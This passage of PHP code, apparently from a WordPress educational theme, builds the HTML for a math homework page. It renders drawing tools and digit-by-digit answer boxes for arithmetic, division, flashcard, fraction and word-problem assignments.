    $html .= '<div>';
    $html .= '<input id="pencil-4" name="pencil" value="4" type="radio">';
    $html .= '<label for="pencil-4">';
    $html .= '<span><hr></span>';
    $html .= '</label>';
    $html .= '</div>';
    $html .= '</div>';
    $html .= '</div>';
    $html .= '<hr>';
    $html .= '<div class="block-menu"><img src="' . site_url() . '/wp-content/themes/ik-learn/library/images/Color_Selection.png" class="icon-block">';
    $html .= '<div class="custom-radios">';
    $html .= '<div>';
    $html .= '<input id="color-black" name="color" value="#000000" checked="" type="radio">';
    $html .= '<label for="color-black">';
    $html .= '<span></span>';
    $html .= '</label>';
    $html .= '</div>';

    $html .= '<div>';
    $html .= '<input id="color-blue" name="color" value="#0000FF" type="radio">';
    $html .= '<label for="color-blue">';
    $html .= '<span></span>';
    $html .= '</label>';
    $html .= '</div>';

    $html .= '<div>';
    $html .= '<input id="color-red" name="color" value="#FF0000" type="radio">';
    $html .= '<label for="color-red">';
    $html .= '<span></span>';
    $html .= '</label>';
    $html .= '</div>';

    $html .= '<div>';
    $html .= '<input id="color-green" name="color" value="#008000" type="radio">';
    $html .= '<label for="color-green">';
    $html .= '<span></span>';
    $html .= '</label>';
    $html .= '</div>';

    $html .= '<div>';
    $html .= '<input id="color-white" name="color" value="#FFFFFF" type="radio">';
    $html .= '<label for="color-white">';
    $html .= '<span></span>';
    $html .= '</label>';
    $html .= '</div>';
    $html .= '</div>';
    $html .= '</div>';
    $html .= '<hr>';
    $html .= '<div class="block-menu last"><img id="pencilrubber" data-title="Eraser" src="' . site_url() . '/wp-content/themes/ik-learn/library/images/Eraser.png" class="icon-block">';
    $html .= '<div class="custom-radios radio-eraser">';
    $html .= '<div>';
    $html .= '<input id="eraser-200" name="eraser" value="100" type="radio">';
    $html .= '<label for="eraser-200">';
    $html .= '<span></span>';
    $html .= '</label>';
    $html .= '</div>';

    $html .= '<div>';
    $html .= '<input id="eraser-100" name="eraser" value="80" type="radio">';
    $html .= '<label for="eraser-100">';
    $html .= '<span></span>';
    $html .= '</label>';
    $html .= '</div>';

    $html .= '<div>';
    $html .= '<input id="eraser-50" name="eraser" value="50" checked="" type="radio">';
    $html .= '<label for="eraser-50">';
    $html .= '<span></span>';
    $html .= '</label>';
    $html .= '</div>';
    $html .= '</div>';
    $html .= '</div>';
    $html .= '<div id="clear-state" class="clear-state"><img src="' . site_url() . '/wp-content/themes/ik-learn/library/images/Clear.png"></div>';
    $html .= '</div>';
    // Section Right    
    $html .= '<div class="col-sm-2 homework-nav" style=" height: 525px;float: right;background: #F5F0A3;">';
//    for($i=1 ; $i <= count($questions['q']); $i++) {
//        $html .= '<input type="hidden" id="array-param'.$i.'" value="'.$questions['q']['q' . $i]['param'].'" />';
//    }
    $html .= '<div><span class="ic-next-work" data-param=' . $questions['q']['q' . $i]['param'] . '></span></div>';
    $html .= '<div><span class="ic-preview-work"></span></div>';
    $html .= '<div class="div-total-num-sheet"><span id="sheet-current">1</span><span>/</span><span id="total-sh"></span></div>';
    $html .= '<div><a href="' . home_url() . "/?r=tutoring-plan" . '" class="ic-math-tutoring css-only-show-tablet"></a></div>';
    $html .= '<div><span class="css-notepad-btn css-only-show-tablet"></span></div>';
    $html .= '</div>';
    $html .= '<div id="homework-content" class="col-sm-10 homework-content math-type-' . $homework->assignment_id . '" style="border-right: 0 solid #F5F0A3; !important;">';
    switch ($homework->assignment_id) :
        case MATH_ASSIGNMENT_SINGLE_DIGIT:
//        math_digit_box($questions['op1'],null,0,MATH_ASSIGNMENT_SINGLE_DIGIT,MATH_ASSIGNMENT_SINGLE_DIGIT);
            $digits = str_split($questions['op1']);
            $html .= '<span style=" float:left;font-weight: bold;font-size: 20pt;padding-left: 10%;" >Number 1</span>';
            $html .= '<span class="formula-steps">';
            foreach ($digits as $d) :
                $html .= '<span class="math-number">' . $d . '</span>';
            endforeach;
            $html .= '</span>';
//        math_digit_box($questions['op2'], $questions['sign'], strlen($questions['op1']) - strlen($questions['op2']),MATH_ASSIGNMENT_SINGLE_DIGIT);
            $digits2 = str_split($questions['op2']);
            $html .= '<span style=" float:left;font-weight: bold;font-size: 20pt;padding-left: 10%;" >Number 2</span>';
            $html .= '<span class="formula-steps">';
            if (!empty($questions['sign'])) :
                $html .= '<span class="math-number sign">' . $questions['sign'] . '</span>';
                if (strlen($questions['op1']) > 0) :
                    for ($i = 1; $i <= strlen($questions['op1']); $i++) :
                        $html .= '<span class="math-number empty"></span>';
                    endfor;
                endif;
            endif;
            foreach ($digits2 as $d) :
                $html .= '<span class="math-number">' . $d . '</span>';
            endforeach;
            $html .= '</span>';
            $html .= '<hr class="hr-formula hr-num-4">';
//        MWHtml::math_answer_box($questions['step']['s1'], 1, 'result[s1]', MATH_ASSIGNMENT_SINGLE_DIGIT);
            $b = trim($questions['step']['s1']);
            $dg1 = str_split($b);
            if ($b !== '') {
                $html .= '<span class="formula-steps" id="answer-step-1">';
                $html .= '<span style=" float:left;font-weight: bold;font-size: 20pt;padding-left: 10%;" >';
                $html .= 'Partial Sum';
                $html .= '</span>';
//            var_dump($dg1);die;
                $m1 = 0;
                foreach ($dg1 as $d) :
                    if ($d === '@') :
                        $html .= '<span class="math-number empty">' . "&nbsp;" . '</span>';
                    else:
                        $html .= '<span class="math-number input-box"><input type="text" class="s1 input-answer" maxlength="1" autocomplete="off" data-answer="' . $d . '" name="result[s1][' . $m1 . ']"></span>';
                        $m1++;
                    endif;
                endforeach;
            }
//        MWHtml::math_answer_box($questions['step']['s2'], 2, 'result[s2]', MATH_ASSIGNMENT_SINGLE_DIGIT,$questions['sign']);
            $a = trim($questions['step']['s2']);
            $dg2 = str_split($a);
            if ($a !== '') {
                $html .= '<span class="formula-steps" id="answer-step-2">';
                $html .= '<span style=" float:left;font-weight: bold;font-size: 20pt;padding-left: 10%;" >';
                if ($questions['sign'] != null) {
                    $html .= 'Borrow';
                } else {
                    $html .= 'Carry';
                }
                $html .= '</span>';
                $m2 = 0;
                foreach ($dg2 as $d) :
                    if ($d === '@') :
                        $html .= '<span class="math-number empty">' . "&nbsp;" . '</span>';
                    else:
                        $html .= '<span class="math-number input-box"><input type="text" class="s1 input-answer" maxlength="1" autocomplete="off" data-answer="' . $d . '" name="result[s2][' . $m2 . ']"></span>';
                        $m2++;
                    endif;
                endforeach;
            }
            $html .= '</span>';
            $html .= '<hr class="hr-formula hr-num-4">';
//        MWHtml::math_answer_box($questions['step']['s3'], 3, 'result[s3]',MATH_ASSIGNMENT_SINGLE_DIGIT);
            $c = trim($questions['step']['s3']);
            $dg3 = str_split($c);
            if ($b !== '') {
                $html .= '<span class="formula-steps" id="answer-step-3">';
                $html .= '<span style=" float:left;font-weight: bold;font-size: 20pt;padding-left: 10%;" >';
                $html .= 'Answer';
                $html .= '</span>';
                $m3 = 0;
                foreach ($dg3 as $d) :
                    if ($d === '@') :
                        $html .= '<span class="math-number empty">' . "&nbsp;" . '</span>';
                    else:
                        $html .= '<span class="math-number input-box"><input type="text" class="s1 input-answer" maxlength="1" autocomplete="off" data-answer="' . $d . '" name="result[s3][' . $m3 . ']"></span>';
                        $m3++;
                    endif;
                endforeach;
            }
            break;
        case MATH_ASSIGNMENT_TWO_DIGIT_MUL:
//        MWHtml::math_digit_box($questions['op1'],null,0,MATH_ASSIGNMENT_TWO_DIGIT_MUL,MATH_ASSIGNMENT_TWO_DIGIT_MUL);
            $e = str_split($questions['op1']);
            $html .= '<span style=" float:left;font-weight: bold;font-size: 20pt;padding-left: 10%;" >Multiplicant</span>';
            $html .= '<span class="formula-steps">';
            foreach ($e as $d) :
                $html .= '<span class="math-number">' . $d . '</span>';
            endforeach;
            $html .= '</span>';
//        MWHtml::math_digit_box($questions['op2'], 'x', strlen($questions['op1']) - strlen($questions['op2']),MATH_ASSIGNMENT_TWO_DIGIT_MUL);
            $g = str_split($questions['op2']);
            $html .= '<span style=" float:left;font-weight: bold;font-size: 20pt;padding-left: 10%;" >Multiplier</span>';
            $html .= '<span class="formula-steps">';
            if (!empty('x')) :
                $html .= '<span class="math-number sign">' . 'x' . '</span>';
                if (strlen($questions['op1']) - strlen($questions['op2']) > 0) :
                    for ($i = 1; $i <= strlen($questions['op1']) - strlen($questions['op2']); $i++) :
                        $html .= '<span class="math-number empty"></span>';
                    endfor;
                endif;
            endif;
            foreach ($g as $d) :
                $html .= '<span class="math-number">' . $d . '</span>';
            endforeach;
            $html .= '</span>';
            $html .= '<hr class="hr-formula hr-num-4">';
            for ($i = 1; $i <= 4; $i++) {
                MATH_ASSIGNMENT_TWO_DIGIT_MUL;
//            MWHtml::math_answer_box($questions['step']['s' . $i], $i, 'result[s' . $i . ']',MATH_ASSIGNMENT_TWO_DIGIT_MUL);
                $m = trim($questions['step']['s' . $i]);
                if ($m !== '') {
                    $m = str_split($m);
                    $html .= '<span class="formula-steps" id="answer-step-' . $i . '">';
                    $html .= '<span style=" float:left;font-weight: bold;font-size: 20pt;padding-left: 10%;" >';
                    if ($i == 1) {
                        $html .= 'Partical Sum';
                    } else if ($i == 2) {
                        $html .= 'Carry';
                    } else if ($i == 3) {
                        $html .= 'Partical Sum';
                    } else if ($i == 4) {
                        $html .= 'Carry';
                    } else if ($i == 5) {
                        $html .= 'Partical Sum';
                    } else if ($i == 6) {
                        $html .= 'Carry';
                    } else if ($i == 7) {
                        $html .= 'Answer';
                    }
                    $html .= '</span>';
                    $n1 = 0;
                    foreach ($m as $d) :
                        if ($d === '@') :
                            $html .= '<span class="math-number empty">' . "&nbsp;" . '</span>';
                        else :
                            $html .= '<span class="math-number input-box"><input type="text" class="s1 input-answer" maxlength="1" autocomplete="off" data-answer="' . $d . '" name="' . 'result[s' . $i . '][' . $n1 . ']" ></span>';
                            $n1++;
                        endif;
                    endforeach;
                    $html .= '</span>';
                }
            }
            $html .= '<hr class="hr-formula hr-num-4">';
//        MWHtml::math_answer_box($questions['step']['s5'], 5, 'result[s5]',MATH_ASSIGNMENT_TWO_DIGIT_MUL);
            $n = trim($questions['step']['s5']);
            if ($n !== '') {
                $n = str_split($n);
                $html .= '<span class="formula-steps" id="answer-step-5">';
                $html .= '<span style=" float:left;font-weight: bold;font-size: 20pt;padding-left: 10%;" >';
                $html .= 'Partical Sum';
                $html .= '</span>';
                $n2 = 0;
                foreach ($n as $d) :
                    if ($d === '@') :
                        $html .= '<span class="math-number empty">' . "&nbsp;" . '</span>';
                    else:
                        $html .= '<span class="math-number input-box"><input type="text" class="s1 input-answer" maxlength="1" autocomplete="off" data-answer="' . $d . '" name="result[s5][' . $n2 . ']"></span>';
                        $n2++;
                    endif;
                endforeach;
                $html .= '</span>';
            }
//        MWHtml::math_answer_box($questions['step']['s6'], 6, 'result[s6]',MATH_ASSIGNMENT_TWO_DIGIT_MUL);
            $g = trim($questions['step']['s6']);
            if ($g !== '') {
                $g = str_split($g);
                $html .= '<span class="formula-steps" id="answer-step-6">';
                $html .= '<span style=" float:left;font-weight: bold;font-size: 20pt;padding-left: 10%;" >';
                $html .= 'Carry';
                $html .= '</span>';
                $n3 = 0;
                foreach ($g as $d) :
                    if ($d === '@') :
                        $html .= '<span class="math-number empty">&nbsp;</span>';
                    else:
                        $html .= '<span class="math-number input-box"><input type="text" class="s1 input-answer" maxlength="1" autocomplete="off" data-answer="' . $d . '" name="result[s6][' . $n3 . ']"></span>';
                        $n3++;
                    endif;
                endforeach;
                $html .= '</span>';
            }
            $html .= '<hr class="hr-formula hr-num-4">';
//        MWHtml::math_answer_box($questions['step']['s7'], 7, 'result[s7]',MATH_ASSIGNMENT_TWO_DIGIT_MUL);
            $f = trim($questions['step']['s7']);
            if ($f !== '') {
                $f = str_split($f);
                $html .= '<span class="formula-steps" id="answer-step-7">';
                $html .= '<span style=" float:left;font-weight: bold;font-size: 20pt;padding-left: 10%;" >';
                $html .= 'Answer';
                $html .= '</span>';
                $n4 = 0;
                foreach ($f as $d) :
                    if ($d === '@') :
                        $html .= '<span class="math-number empty">' . "&nbsp;" . '</span>';
                    else:
                        $html .= '<span class="math-number input-box"><input type="text" class="s1 input-answer" maxlength="1" autocomplete="off" data-answer="' . $d . '" name="result[s7][' . $n4 . ']"></span>';
                        $n4++;
                    endif;
                endforeach;
                $html .= '</span>';
            }
            break;
        case MATH_ASSIGNMENT_SINGLE_DIGIT_DIV:
            if ($curr_mode == 'homework') {
                $nav_li_class[] = 'not-active visited';
            }

            $_prev = 'empty';
            foreach ($questions['step'] as $k => $v) {
                if (isset($v) && $v != '') {
                    if (in_array($homework->assignment_id, array(MATH_ASSIGNMENT_SINGLE_DIGIT_DIV, MATH_ASSIGNMENT_TWO_DIGIT_DIV))) {
                        $no_steps[] = substr($k, 1);
                    } else {
                        // check the case both ops are single digit
                        if (substr($k, 1) % 2 != 0) {
                            $no_steps[] = substr($k, 1);
                        } else if (strlen($_prev) > 1) {
                            $no_steps[] = substr($k, 1);
                        }
                        $_prev = str_replace('@', '', $v);
                    }
                }
            }
//        var_dump($no_steps);die;
            $last_step = count($no_steps);
            $last_step = count($no_steps);
//        MWHtml::math_answer_box($questions['step']['s' . $last_step], $last_step, 'result[s' . $last_step . ']',MATH_ASSIGNMENT_SINGLE_DIGIT_DIV);
            $dv = trim($questions['step']['s' . $last_step]);
            if ($dv !== '') {
                $dv = str_split($dv);
                $html .= '<span class="formula-steps" id="answer-step-' . $last_step . '">';
                $html .= '<span style=" float:left;font-weight: bold;font-size: 20pt;padding-left: 10%;" >';
                if ($last_step == 1) {
                    $html .= '';
                } else if ($last_step == 2) {
                    $html .= '';
                } else if ($last_step == 3) {
                    $html .= '';
                } else if ($last_step == 4) {
                    $html .= 'Steps';
                } else if ($last_step == 5) {
                    $html .= '';
                } else if ($last_step == 6) {
                    $html .= '';
                } else if ($last_step == 7) {
                    $html .= '';
                } else if ($last_step == 8) {
                    $html .= '';
                } else if ($last_step == 9) {
                    $html .= 'Remainder';
                } else if ($last_step == 10) {
                    $html .= 'Answer';
                }
                $html .= '</span>';
                $k1 = 0;
                foreach ($dv as $d) :
                    if ($d === '@') :
                        $html .= '<span class="math-number empty">' . "&nbsp;" . '</span>';
                    else:
                        $html .= '<span class="math-number input-box"><input type="text" class="s1 input-answer" maxlength="1" autocomplete="off" data-answer="' . $d . '" name="result[s' . $last_step . '][' . $k1 . ']"></span>';
                        $k1++;
                    endif;
                endforeach;
                $html .= '</span>';
            }
//        MWHtml::math_digit_box_division($questions['op1'], $questions['op2']);
            $dividend = str_split($questions['op1']);
            $divisor = str_split($questions['op2']);
            $html .= '<span style=" float:left;font-weight: bold;font-size: 20pt;padding-left: 10%;" >Divisor / Dividend</span>';
            $html .= '<span class="formula-steps">';
            foreach ($divisor as $d) :
                $html .= '<span class="math-number">' . $d . '</span>';
            endforeach;
            $html .= '<span class="math-number empty division-line">' . "&nbsp;" . '</span>';
            foreach ($dividend as $d) :
                $html .= '<span class="math-number dividend">' . $d . '</span>';
            endforeach;
            $html .= '</span>';
            for ($i = 1; $i <= $last_step - 2; $i++) {
//            MWHtml::math_answer_box($questions['step']['s' . $i], $i, 'result[s' . $i . ']',MATH_ASSIGNMENT_SINGLE_DIGIT_DIV);
                $sdv = trim($questions['step']['s' . $i]);
                if ($sdv !== '') {
                    $sdv = str_split($sdv);
                    $html .= '<span class="formula-steps" id="answer-step-' . $i . '">';
                    $html .= '<span style=" float:left;font-weight: bold;font-size: 20pt;padding-left: 10%;" >';
                    if ($i == 1) {
                        $html .= '';
                    } else if ($i == 2) {
                        $html .= '';
                    } else if ($i == 3) {
                        $html .= '';
                    } else if ($i == 4) {
                        $html .= 'Steps';
                    } else if ($i == 5) {
                        $html .= '';
                    } else if ($i == 6) {
                        $html .= '';
                    } else if ($i == 7) {
                        $html .= '';
                    } else if ($i == 8) {
                        $html .= '';
                    } else if ($i == 9) {
                        $html .= 'Remainder';
                    } else if ($i == 10) {
                        $html .= 'Answer';
                    }
                    $html .= '</span>';
                    $k2 = 0;
                    foreach ($sdv as $d) :
                        if ($d === '@') :
                            $html .= '<span class="math-number empty">' . "&nbsp;" . '</span>';
                        else:
                            $html .= '<span class="math-number input-box"><input type="text" class="s1 input-answer" maxlength="1" autocomplete="off" data-answer="' . $d . '" name="result[s' . $i . '][' . $k2 . ']"></span>';
                            $k2++;
                        endif;
                    endforeach;
                    $html .= '</span>';
                }
            }
            $html .= '<hr class="hr-formula hr-num-2">';
            $remainder_step = $last_step - 1;
//        MWHtml::math_answer_box($questions['step']['s' . $remainder_step], $remainder_step, 'result[s' . $remainder_step . ']',MATH_ASSIGNMENT_SINGLE_DIGIT_DIV);
            $ddv = trim($questions['step']['s' . $remainder_step]);
            if ($ddv !== '') {
                $ddv = str_split($ddv);
                $html .= '<span class="formula-steps" id="answer-step-' . $remainder_step . '">';
                $html .= '<span style=" float:left;font-weight: bold;font-size: 20pt;padding-left: 10%;" >';
                if ($remainder_step == 1) {
                    $html .= '';
                } else if ($remainder_step == 2) {
                    $html .= '';
                } else if ($remainder_step == 3) {
                    $html .= '';
                } else if ($remainder_step == 4) {
                    $html .= 'Steps';
                } else if ($remainder_step == 5) {
                    $html .= '';
                } else if ($remainder_step == 6) {
                    $html .= '';
                } else if ($remainder_step == 7) {
                    $html .= '';
                } else if ($remainder_step == 8) {
                    $html .= '';
                } else if ($remainder_step == 9) {
                    $html .= 'Remainder';
                } else if ($remainder_step == 10) {
                    $html .= 'Answer';
                }
                $html .= '</span>';
                $k3 = 0;
                foreach ($ddv as $d) :
                    if ($d === '@') :
                        $html .= '<span class="math-number empty">' . "&nbsp;" . '</span>';
                    else:
                        $html .= '<span class="math-number input-box"><input type="text" class="s1 input-answer" maxlength="1" autocomplete="off" data-answer="' . $d . '" name="result[s' . $remainder_step . '][' . $k3 . ']"></span>';
                        $k3++;
                    endif;
                endforeach;
                $html .= '</span>';
            }
            break;
        case MATH_ASSIGNMENT_TWO_DIGIT_DIV:
            if ($curr_mode == 'homework') {
                $nav_li_class[] = 'not-active visited';
            }

            $_prev = 'empty';
            foreach ($questions['step'] as $k => $v) {
                if (isset($v) && $v != '') {
                    if (in_array($homework->assignment_id, array(MATH_ASSIGNMENT_SINGLE_DIGIT_DIV, MATH_ASSIGNMENT_TWO_DIGIT_DIV))) {
                        $no_steps[] = substr($k, 1);
                    } else {
                        // check the case both ops are single digit
                        if (substr($k, 1) % 2 != 0) {
                            $no_steps[] = substr($k, 1);
                        } else if (strlen($_prev) > 1) {
                            $no_steps[] = substr($k, 1);
                        }
                        $_prev = str_replace('@', '', $v);
                    }
                }
            }
            $last_step = count($no_steps);
//        MWHtml::math_answer_box($questions['step']['s' . $last_step], $last_step, 'result[s' . $last_step . ']',MATH_ASSIGNMENT_TWO_DIGIT_DIV);
            $mtv = trim($questions['step']['s' . $last_step]);
            if ($mtv !== '') {
                $mtv = str_split($mtv);
                $html .= '<span class="formula-steps" id="answer-step-' . $last_step . '">';
                $html .= '<span style=" float:left;font-weight: bold;font-size: 20pt;padding-left: 10%;" >';
                if ($last_step == 1) {
                    $html .= '';
                } else if ($last_step == 2) {
                    $html .= '';
                } else if ($last_step == 3) {
                    $html .= 'Steps';
                } else if ($last_step == 4) {
                    $html .= '';
                } else if ($last_step == 5) {
                    $html .= '';
                } else if ($last_step == 6) {
                    $html .= '';
                } else if ($last_step == 7) {
                    $html .= 'Remainder';
                } else if ($last_step == 8) {
                    $html .= 'Answer';
                }
                $html .= '</span>';
                $q1 = 0;
                foreach ($mtv as $d) :
                    if ($d === '@') :
                        $html .= '<span class="math-number empty">' . "&nbsp;" . '</span>';
                    else:
                        $html .= '<span class="math-number input-box"><input type="text" class="s1 input-answer" maxlength="1" autocomplete="off" data-answer="' . $d . '" name="result[s' . $last_step . '][' . $q1 . ']"></span>';
                        $q1++;
                    endif;
                endforeach;
            }
//        MWHtml::math_digit_box_division($questions['op1'], $questions['op2'],MATH_ASSIGNMENT_TWO_DIGIT_DIV);

            $divi = str_split($questions['op1']);
            $divis = str_split($questions['op2']);
            $html .= '<span style=" float:left;font-weight: bold;font-size: 20pt;padding-left: 10%;" >Divisor / Dividend</span>';
            $html .= '<span class="formula-steps">';
            foreach ($divis as $d) :
                $html .= '<span class="math-number">' . $d . '</span>';
            endforeach;
            $html .= '<span class="math-number empty division-line">' . "&nbsp;" . '</span>';
            foreach ($divi as $d) :
                $html .= '<span class="math-number dividend">' . $d . '</span>';
            endforeach;
            $html .= '</span>';

            for ($i = 1; $i <= $last_step - 2; $i++) {
//            MWHtml::math_answer_box($questions['step']['s' . $i], $i, 'result[s' . $i . ']',MATH_ASSIGNMENT_TWO_DIGIT_DIV);
                $ddf = trim($questions['step']['s' . $i]);
                if ($ddf !== '') {
                    $ddf = str_split($ddf);
                    $html .= '<span class="formula-steps" id="answer-step-' . $i . '">';
                    $html .= '<span style=" float:left;font-weight: bold;font-size: 20pt;padding-left: 10%;" >';
                    if ($i == 1) {
                        $html .= '';
                    } else if ($i == 2) {
                        $html .= '';
                    } else if ($i == 3) {
                        $html .= 'Steps';
                    } else if ($i == 4) {
                        $html .= '';
                    } else if ($i == 5) {
                        $html .= '';
                    } else if ($i == 6) {
                        $html .= '';
                    } else if ($i == 7) {
                        $html .= 'Remainder';
                    } else if ($i == 8) {
                        $html .= 'Answer';
                    }
                    $html .= '</span>';
                    $q2 = 0;
                    foreach ($ddf as $d) :
                        if ($d === '@') :
                            $html .= '<span class="math-number empty">' . "&nbsp;" . '</span>';
                        else:
                            $html .= '<span class="math-number input-box"><input type="text" class="s1 input-answer" maxlength="1" autocomplete="off" data-answer="' . $d . '" name="result[s' . $i . '][' . $q2 . ']"></span>';
                            $q2++;
                        endif;
                    endforeach;
                    $html .= '</span>';
                }
            }
            $html .= '<hr class="hr-formula hr-num-2">';
            $remainder_step = $last_step - 1;
//        MWHtml::math_answer_box($questions['step']['s' . $remainder_step], $remainder_step, 'result[s' . $remainder_step . ']',MATH_ASSIGNMENT_TWO_DIGIT_DIV);
            $ddm = trim($questions['step']['s' . $remainder_step]);
            if ($ddm !== '') {
                $ddm = str_split($ddm);
                $html .= '<span class="formula-steps" id="answer-step-' . $remainder_step . '">';
                $html .= '<span style=" float:left;font-weight: bold;font-size: 20pt;padding-left: 10%;" >';
                if ($remainder_step == 1) {
                    $html .= '';
                } else if ($remainder_step == 2) {
                    $html .= '';
                } else if ($remainder_step == 3) {
                    $html .= 'Steps';
                } else if ($remainder_step == 4) {
                    $html .= '';
                } else if ($remainder_step == 5) {
                    $html .= '';
                } else if ($remainder_step == 6) {
                    $html .= '';
                } else if ($remainder_step == 7) {
                    $html .= 'Remainder';
                } else if ($remainder_step == 8) {
                    $html .= 'Answer';
                }
                $html .= '</span>';
                $q3 = 0;
                foreach ($ddm as $d) :
                    if ($d === '@') :
                        $html .= '<span class="math-number empty">' . "&nbsp;" . '</span>';
                    else:
                        $html .= '<span class="math-number input-box"><input type="text" class="s1 input-answer" maxlength="1" autocomplete="off" data-answer="' . $d . '" name="result[s' . $remainder_step . '][' . $q3 . ']"></span>';
                        $q3++;
                    endif;
                endforeach;
                $html .= '</span>';
            }
            break;
        case MATH_ASSIGNMENT_FLASHCARD:
            $html .= '<p id="boxtruefalse1">Green Box = Correct</p>';
            $html .= '<p id="boxtruefalse">Red Box = Incorrect</p>';
//        var_dump($questions);die;
            foreach ($questions['q'] as $key => $item) {
                $html .= '<div class="flashcard-question hidden" id="flashcard-' . $key . '">';
                $html .= '<span class="math-number">' . $item['op1'] . '</span>';
                $html .= '<span class="math-number">' . str_replace('247', '&divide;', $item['op']) . '</span>';
                $html .= '<span class="math-number">' . $item['op2'] . '</span>';
                $html .= '<span class="math-number">=</span> ';
                if ($homework_assignment->for_practice == 0) {
                    $html .= '<span class="math-number input-box" style=" width: auto;"><input type="text" class="answer-box input-answer" data-answer="' . $item["answer"] . '" name="' . $key . '" style="min-width: 100px;width: 126px;"' . '></span>';
                } else {
                    $html .= '<span class="math-number input-box" style=" width: auto;"><input type="text" class="answer-box input-answer" data-answer="' . $item["answer"] . '" name="' . $key . '" style="min-width: 100px;width: 126px;"' . '></span>';
                }
                $html .= '<span class="math-number">' . $item['note'] . '</span>';
                $html .= '</div>';
            }
            break;
        case MATH_ASSIGNMENT_FRACTION:
            $html .= '<p id="boxtruefalse1">Green Box = Correct</p>';
            $html .= '<p id="boxtruefalse">Red Box = Incorrect</p>';
//        var_dump($questions['q']);die;
            foreach ($questions['q'] as $key => $item) :
                $html .= '<div class="flashcard-question hidden" id="flashcard-' . $key . '">';
                $_f = explode('/', $item['op1']);
                $_lf = explode(' ', $_f[0]);
                $_lf = count($_lf) == 2 ? $_lf : array('', $_lf[0]);
                $op1 = array($_lf[0], $_lf[1], $_f[1]);

                $_f = explode('/', $item['op2']);
                $_lf = explode(' ', $_f[0]);
                $_lf = count($_lf) == 2 ? $_lf : array('', $_lf[0]);
                $op2 = array($_lf[0], $_lf[1], $_f[1]);

                $_f = explode('/', $item['answer']);
                $_lf = explode(' ', $_f[0]);
                $_lf = count($_lf) == 2 ? $_lf : array('', $_lf[0]);
                $answer = array($_lf[0], $_lf[1], $_f[1]);
                if (!empty($op1[0])) :
                    $html .= '<div class="fraction left-number">';
                    $html .= '<span class="math-number" style="width: auto;font-size: 36px; ">' . $op1[0] . '</span>';
                    $html .= '</div>';
                endif;
                if (!empty($op1[1])) :
                    $html .= '<div class="fraction">';
                    if (empty($op1[2])) {
                        $html .= '<span class="math-number " style="width: auto;font-size: 36px;margin-top: 72px;">' . $op1[1] . '</span>';
                    } else {
                        $html .= '<span class="math-number " style="width: auto">' . $op1[1] . '</span>';
                        $html .= '<span class="icon-fraction fraction-answer"></span>';
                        $html .= '<span class="math-number " style="width: auto">' . $op1[2] . '</span>';
                    }
                    $html .= '</div>';
                    $html .= '<div class="fraction">';
                    $html .= '<span class="math-number">&nbsp;</span>';
                    $html .= '<span class="sign">' . str_replace('247', '&divide;', $item['op']) . '</span>';
                    $html .= '<span class="math-number">&nbsp;</span>';
                    $html .= '</div>';
                endif;
                if (!empty($op2[0])) :
                    $html .= '<div class="fraction left-number">';
                    $html .= '<span class="math-number" style="width: auto;font-size: 36px;">' . $op2[0] . '</span>';
                    $html .= '</div>';
                endif;
                $html .= '<div class="fraction">';
                if (empty($op2[2])) {
                    $html .= '<span class="math-number " style="width: auto;font-size: 36px;">' . $op1[1] . '</span>';
                } else {
                    $html .= '<span class="math-number " style="width: auto">' . $op2[1] . '</span>';
                    $html .= '<span class="icon-fraction fraction-answer"></span>';
                    $html .= '<span class="math-number " style="width: auto">' . $op2[2] . '</span>';
                }
                $html .= '</div>';
                $html .= '<div class="fraction">';
                $html .= '<span class="math-number">&nbsp;</span>';
                $html .= '<span class="sign">=</span>';
                $html .= '<span class="math-number">&nbsp;</span>';
                $html .= '</div>';
                if (!empty($answer[0])) :
                    $html .= '<div class="fraction left-number" style = "padding-top:0px">';
                    if (!empty($answer[1]) && !empty($answer[2])) {
                        $html .= '<span class="math-number input-box fraction-answer" style="margin-top: 68px;"><input style="min-width: 100px;"' . 'type="text" class="answer-box input-answer" data-answer="' . $answer[0] . '" data-name="' . $key . '"></span>';
                    } else {
                        $html .= '<span class="math-number input-box fraction-answer" ><input style="min-width: 100px;"' . 'type="text" class="answer-box input-answer" data-answer="' . $answer[0] . '" data-name="' . $key . '"></span>';
                    }
                    $html .= '</div>';
                endif;
                $html .= '<div class="fraction left-number" style = "padding-top:0px">';
                if ($answer[2] == 0) {
                    $html .= '<span class="math-number input-box fraction-answer" style="margin-top: 68px;"><input style="min-width: 100px;" type="text" class="answer-box input-answer" data-answer="' . $answer[1] . '" data-name="' . $key . '"></span>';
                } else {
                    $html .= '<span class="math-number input-box fraction-answer"><input style="min-width: 100px;" type="text" class="answer-box input-answer" data-answer="' . $answer[1] . '" data-name="' . $key . '"></span>';
                }
                if (!empty($answer[2])) :
                    $html .= '<span class="icon-fraction fraction-answer" style="margin-left: 20%;"></span>';
                    $html .= '<span class="math-number input-box fraction-answer"><input style="min-width: 100px;"' . 'type="text" class="answer-box input-answer" data-answer="' . $answer[2] . '" data-name="' . $key . '"></span>';
                endif;
                $html .= '</div>';
                $html .= '</div>';
            endforeach;
            break;
        case MATH_ASSIGNMENT_WORD_PROB:
            if (($admindp == 1 && $teacherdp == 0) || ($admindp == 0 && $teacherdp == 0) || ($admindp == 0 && $teacherdp == 1)) {
                for ($i = 1; $i < count($questions['q']); $i++) {
                    $type_audio = explode('.', $questions['q']['q' . $i]['sound']);
                    if ($questions['q']['q' . $i]['sound'] != '' && ($type_audio[1] == 'mp4' || $type_audio[1] == 'ogg' || $type_audio[1] == 'm4v')):
                        $html .= '<video class="word-prob-video" controls id="word-prob-video-' . "q" . $i . '" style="width:100%; max-height:100%; max-width:100%">';
                        $html .= '<source src="' . MWHtml::math_video_url($questions['q']['q' . $i]['sound']) . '" type="video/mp4">';
                        $html .= 'Your browser does not support the video tag.';
                        $html .= '</video>';
                    else :
                        if ($questions['q']['q' . $i]['image'] != ''):
                            $html .= '<img src="' . MWHtml::math_image_url($questions['q']['q' . $i]['image']) . '" alt="" id="word-prob-step-' . 'q' . $i . '" class="word-prob-steps canvas-layer" data-ctrl="' . $questions['q']['q' . $i]['param'] . ' data-img-src="' . MWHtml::math_image_url($questions['q']['q' . $i]['image']) . '">';
                        endif;
                    endif;
                    if ($questions['q']['q' . $i]['sound'] != '' && $type_audio[1] == 'mp3'):
                        $html .= '<audio class="word-prob-sound" id="word-prob-sound-' . 'q' . $i . '" preload="auto" style="width: 100%;">';
                    endif;
                }
            }else {
                foreach ($questions['q'] as $key => $item) :
                    $type_audio = explode('.', $item['sound']);
                    if ($item['sound'] != '' && ($type_audio[1] == 'mp4' || $type_audio[1] == 'ogg' || $type_audio[1] == 'm4v')):
